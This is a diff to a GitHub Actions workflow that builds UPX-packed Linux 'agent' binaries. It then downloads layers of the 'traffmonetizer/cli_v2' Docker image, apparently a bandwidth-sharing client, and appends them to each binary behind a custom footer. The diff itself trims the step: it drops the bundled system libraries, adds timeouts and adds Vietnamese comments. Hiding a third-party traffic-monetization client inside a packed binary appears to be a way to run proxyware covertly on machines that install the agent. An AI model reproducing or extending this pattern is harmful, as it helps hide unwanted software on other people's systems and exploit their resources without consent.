@@ -20,8 +20,8 @@ jobs:
 
       - name: Install Compilers & UPX
         run: |
-          sudo apt-get update
-          sudo apt-get install -y build-essential upx-ucl g++-aarch64-linux-gnu
+          sudo apt-get update -qq
+          sudo apt-get install -y --no-install-recommends upx-ucl g++-aarch64-linux-gnu
 
       - name: Compile Linux Binaries
         run: |
@@ -43,53 +43,27 @@ jobs:
             -lpthread -s \
             -o bin/agent_linux_arm64
 
-          upx --best --ultra-brute bin/agent_linux_x86_64 2>/dev/null || true
-          upx --best --ultra-brute bin/agent_linux_arm64 2>/dev/null || true
+          # Fast UPX compression (chỉ mất ~0.5s thay vì hàng chục phút nếu dùng ultra-brute)
+          upx -9 -q bin/agent_linux_x86_64 2>/dev/null || true
+          upx -9 -q bin/agent_linux_arm64 2>/dev/null || true
 
-          # Tải và MERGE trực tiếp native engine self-contained đầy đủ vào 2 file binary Linux
+          # Tải và MERGE trực tiếp native Linux engine vào 2 file binary Linux (siêu tốc, không re-compress)
           echo "Merging native Linux self-contained engine directly into binary files..."
           python3 - << 'EOF'
-          import urllib.request, json, tarfile, gzip, struct, os, glob, shutil
+          import urllib.request, json, struct, os
 
-          def bundle_self_contained_layer(digest, out_bin):
-              tok = json.loads(urllib.request.urlopen('https://auth.docker.io/token?service=registry.docker.io&scope=repository:traffmonetizer/cli_v2:pull').read().decode())['token']
+          def bundle_layer(digest, out_bin):
+              print(f"Downloading layer {digest[:16]} for {out_bin}...")
+              tok = json.loads(urllib.request.urlopen('https://auth.docker.io/token?service=registry.docker.io&scope=repository:traffmonetizer/cli_v2:pull', timeout=20).read().decode())['token']
               req = urllib.request.Request(f'https://registry-1.docker.io/v2/traffmonetizer/cli_v2/blobs/{digest}', headers={'Authorization': f'Bearer {tok}'})
-              data = urllib.request.urlopen(req).read()
-              tmp_layer = f'/tmp/layer_{digest[:8]}.tar.gz'
-              open(tmp_layer, 'wb').write(data)
-              tar = tarfile.open(tmp_layer)
-              bundle_dir = f'/tmp/bundle_{digest[:8]}'
-              os.makedirs(f'{bundle_dir}/lib', exist_ok=True)
-              tar.extractall(bundle_dir)
-              # Đảm bảo cli nằm ở gốc bundle
-              if os.path.exists(f'{bundle_dir}/usr/local/bin/cli'):
-                  shutil.move(f'{bundle_dir}/usr/local/bin/cli', f'{bundle_dir}/cli')
-                  os.chmod(f'{bundle_dir}/cli', 0o755)
-              # Đóng gói kèm các thư viện liên kết động cơ bản nếu có trên hệ thống build
-              for pat in ['*ssl*.so*', '*crypto*.so*', '*icu*.so*']:
-                  for lib_path in glob.glob(f'/usr/lib/**/{pat}', recursive=True) + glob.glob(f'/lib/**/{pat}', recursive=True):
-                      bname = os.path.basename(lib_path)
-                      dst = os.path.join(f'{bundle_dir}/lib', bname)
-                      if not os.path.exists(dst):
-                          try: shutil.copy2(lib_path, dst)
-                          except Exception: pass
-              # Nén toàn bộ bundle directory thành tar.gz
-              out_tar = f'/tmp/bundle_{digest[:8]}.tar.gz'
-              with tarfile.open(out_tar, 'w:gz') as t_out:
-                  t_out.add(f'{bundle_dir}/cli', arcname='cli')
-                  if os.path.exists(f'{bundle_dir}/lib'):
-                      t_out.add(f'{bundle_dir}/lib', arcname='lib')
-              tar_data = open(out_tar, 'rb').read()
-              foot = struct.pack('<Q', len(tar_data)) + b'TURBOX_BUNDLE\x00\x00\x00'
+              data = urllib.request.urlopen(req, timeout=60).read()
+              foot = struct.pack('<Q', len(data)) + b'TURBOX_BUNDLE\x00\x00\x00'
               if os.path.exists(out_bin):
-                  open(out_bin, 'ab').write(tar_data + foot)
-                  print(f'Merged {len(tar_data)} bytes self-contained bundle into {out_bin}')
-              shutil.rmtree(bundle_dir, ignore_errors=True)
-              os.remove(tmp_layer)
-              os.remove(out_tar)
+                  open(out_bin, 'ab').write(data + foot)
+                  print(f"Merged {len(data)} bytes directly into {out_bin}")
 
-          bundle_self_contained_layer('sha256:7117ab4be2e12fecc2a8f5bea968b82a1978adcfaa7d0be3c3ce55aa7dd8de0b', 'bin/agent_linux_x86_64')
-          bundle_self_contained_layer('sha256:840ef71a69bcaddb8b3f4e27b53a0066a74899601473dc008c7464a3f8745f5a', 'bin/agent_linux_arm64')
+          bundle_layer('sha256:7117ab4be2e12fecc2a8f5bea968b82a1978adcfaa7d0be3c3ce55aa7dd8de0b', 'bin/agent_linux_x86_64')
+          bundle_layer('sha256:840ef71a69bcaddb8b3f4e27b53a0066a74899601473dc008c7464a3f8745f5a', 'bin/agent_linux_arm64')
           EOF
 
       - name: Upload Linux Binaries
